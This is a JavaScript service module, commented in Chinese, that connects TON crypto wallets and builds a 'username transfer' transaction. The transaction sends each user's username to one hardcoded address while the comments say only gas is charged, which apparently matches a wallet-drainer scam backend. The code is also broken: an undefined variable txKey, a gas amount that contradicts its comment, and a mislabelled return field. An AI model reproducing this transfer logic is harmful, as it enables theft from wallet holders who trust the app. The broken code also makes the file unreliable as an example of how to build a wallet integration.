import redis from "../utils/redis.js";
import TonWeb from "tonweb";
import crypto from "crypto";

const tonweb = new TonWeb(
  new TonWeb.HttpProvider("https://toncenter.com/api/v2/jsonRPC")
);

export class WalletService {
  /**
   * 连接钱包
   */
  static async connectWallet(wallet, raw) {
    try {
      // 将钱包信息存储到Redis，设置过期时间（24小时）
      const walletKey = `wallet:${wallet}`;
      await redis.setex(
        walletKey,
        86400,
        JSON.stringify({
          ...raw,
          connectedAt: new Date().toISOString(),
          lastActivity: new Date().toISOString(),
        })
      );

      console.log("钱包连接成功，已缓存到Redis:", wallet);

      return {
        success: true,
        message: "",
        data: {
          status: "connected",
        },
      };
    } catch (error) {
      throw new Error(`connected error: ${error.message}`);
    }
  }

  /**
   * 生成用户名转移交易（标准方式）
   */
  static async createTransaction(wallet, productInfo) {
    try {
      console.log("createTransaction", wallet, productInfo);
      const walletKey = `wallet:${wallet}`;
      const walletData = await redis.get(walletKey);

      if (!walletData) {
        throw new Error("walletData not found");
      }
      const username = productInfo[2];
      const newOwnerAddress =
        "UQBpLklcE-q4blWYIm_oKCZodHH4Aj-n9KDv6WEMOktSh7dW";

      // 用户名转移是免费的，只需要很少的Gas费用
      const gasFee = "0.01"; // 0.001 TON in nanoTON
      console.log("username", username, gasFee, newOwnerAddress);

      // 由服务端决定转移参数，防止前端篡改
      const messages = [
        {
          address: newOwnerAddress, // 新所有者地址
          amount: gasFee, // Gas费用（nanoTON）
          payload: this.createUsernameTransferPayload(
            username,
            newOwnerAddress
          ),
        },
      ];
      console.log("messages", messages);
      // raw 内放业务信息，回传给前端
      const raw = {
        username,
        newOwnerAddress,
        wallet,
        amount: gasFee,
        transferType: "username",
        ts: Date.now(),
      };

      // 生成HMAC签名
      const sig = this.signRaw(raw);

      console.log("用户名转移交易数据已生成:", txKey);

      return {
        success: true,
        data: { messages, raw, sig },
        txKey: txKey,
        messages: sig,
      };
    } catch (error) {
      console.error("生成用户名转移交易错误:", error);
      throw new Error(`生成用户名转移交易失败: ${error.message}`);
    }
  }

  /**
   * HMAC签名
   */
  static signRaw(rawObj) {
    const json = JSON.stringify(rawObj);
    const appSecret = process.env.APP_SECRET;
    return crypto.createHmac("sha256", appSecret).update(json).digest("hex");
  }

  /**
   * 验证HMAC签名
   */
  static verifyRaw(rawObj, signature) {
    const expected = this.signRaw(rawObj);
    return crypto.timingSafeEqual(
      Buffer.from(expected),
      Buffer.from(signature)
    );
  }

  /**
   * 创建用户名转移payload
   */
  static createUsernameTransferPayload(username, newOwnerAddress) {
    try {
      // 简化的payload，实际项目中可能需要更复杂的结构
      const payload = {
        type: "username_transfer",
        username: username,
        newOwner: newOwnerAddress,
        timestamp: Date.now(),
      };

      return Buffer.from(JSON.stringify(payload)).toString("base64");
    } catch (error) {
      throw new Error(`创建用户名转移payload失败: ${error.message}`);
    }
  }
}
